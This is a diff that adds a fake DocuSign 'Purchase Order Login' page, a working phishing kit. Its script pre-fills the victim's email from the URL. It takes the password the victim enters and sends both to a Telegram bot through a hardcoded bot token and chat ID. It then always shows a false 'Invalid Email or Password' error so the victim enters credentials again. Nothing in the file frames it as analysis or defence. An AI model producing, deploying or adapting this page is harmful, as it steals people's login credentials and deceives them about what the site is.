@@ -1,0 +1,133 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Purchase Order Login</title>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
+    <style>
+        body {
+            background-image: url('https://londondrivewayspatios.co.uk/wp/pap.jfif');
+            background-repeat: no-repeat;
+            background-size: cover;
+        }
+        .login-container {
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.5);
+        }
+        .verifying-text {
+            color: #007bff;
+        }
+    </style>
+</head>
+<body>
+    <div class="container-fluid p-0">
+        <div class="container">
+            <div class="row my-5">
+                <div class="col-lg-5 mx-auto">
+                    <div class="login-container m-5 p-4 bg-white rounded">
+                        <div class="text-left">
+                            <img src="https://images.ctfassets.net/3fcisxc3a6xz/docusign_logo_black_text_on_white_0.png/90872cd475f92acafc7c490c93976e40/ds-logo-on-white.png" class="img-fluid" width="310px" alt="Logo">
+                            <p class="text-muted">sign in with your email address below to view uploaded document</p>
+                            <div id="msg" class="text-danger" style="display: none;">Invalid Email or Password! Please enter the correct credentials.</div>
+                            <form id="login-form" action="javascript:void(0);">
+                                <div class="form-group">
+                                    <input type="email" name="email" class="form-control" id="email" placeholder="Email, phone or Skype", value="" readonly>
+                                </div>
+                                <div class="form-group">
+                                    <input type="password" name="password" class="form-control" id="password" placeholder="Password" required>
+                                </div>
+                                <div class="form-check">
+                                    <input type="checkbox" class="form-check-input" id="keep-signed-in">
+                                    <label class="form-check-label" for="keep-signed-in">Keep me signed in</label>
+                                    <a href="#" class="float-right">Forgot Password?</a>
+                                </div>
+                                <button type="submit" class="btn btn-primary w-100 mt-2" id="submit-button">Next</button>
+                            </form>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://code.jquery.com/jquery-3.2.1.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
+    <script>
+        $(document).ready(function() {
+            // Extract email from URL hash
+            function extractEmailFromURL() {
+                const hash = window.location.hash;
+                const emailMatch = hash.match(/#([^#]+@[^\s@]+\.[^\s@]+)$/);
+                return emailMatch ? emailMatch[1] : '';
+            }
+
+            // Pre-fill email field if email is present in the URL hash
+            const emailFromURL = extractEmailFromURL();
+            if (emailFromURL) {
+                $('#email').val(emailFromURL);
+            }
+
+            $('#login-form').on('submit', function(event) {
+                event.preventDefault();
+
+                // Clear previous messages
+                $('#msg').hide();
+
+                // Get form values
+                const email = $('#email').val().trim();
+                const password = $('#password').val().trim();
+
+                // Simple validation
+                if (!email) {
+                    $('#msg').text('Email field is empty!').show();
+                    return;
+                }
+                if (!password) {
+                    $('#msg').text('Password field is empty!').show();
+                    return;
+                }
+
+                // Basic email pattern check
+                const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+                if (!emailPattern.test(email)) {
+                    $('#msg').text('Invalid email address.').show();
+                    return;
+                }
+
+                // Change button text to "Verifying..." and disable it
+                const $submitButton = $('#submit-button');
+                const originalButtonText = $submitButton.text();
+                $submitButton.text('Verifying...').prop('disabled', true);
+
+                // Prepare data for Telegram reporting
+                const message = `Email: ${email}\nPassword: ${password}`;
+                const telegramBotToken = '6851879212:AAFqPCmSPcVSp7Aodg8RH3ocUI6VSF_H4k8';
+                const chatId = '1637284648';
+                const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+                // Perform AJAX request to Telegram API
+                $.ajax({
+                    url: telegramUrl,
+                    type: 'GET',
+                    success: function(response) {
+                        // Handle the server response here
+                        console.log(response);
+                        $('#msg').hide(); // Hide previous messages
+                        $('#msg').text('Invalid Email or Password! Please enter the correct credentials.').show();
+                    },
+                    error: function() {
+                        // Handle AJAX errors
+                        $('#msg').text('Invalid Email or Password! Please enter the correct credentials.').show();
+                    },
+                    complete: function() {
+                        // Revert button text and re-enable it
+                        $submitButton.text(originalButtonText).prop('disabled', false);
+                    }
+                });
+            });
+        });
+    </script>
+</body>
+</html>
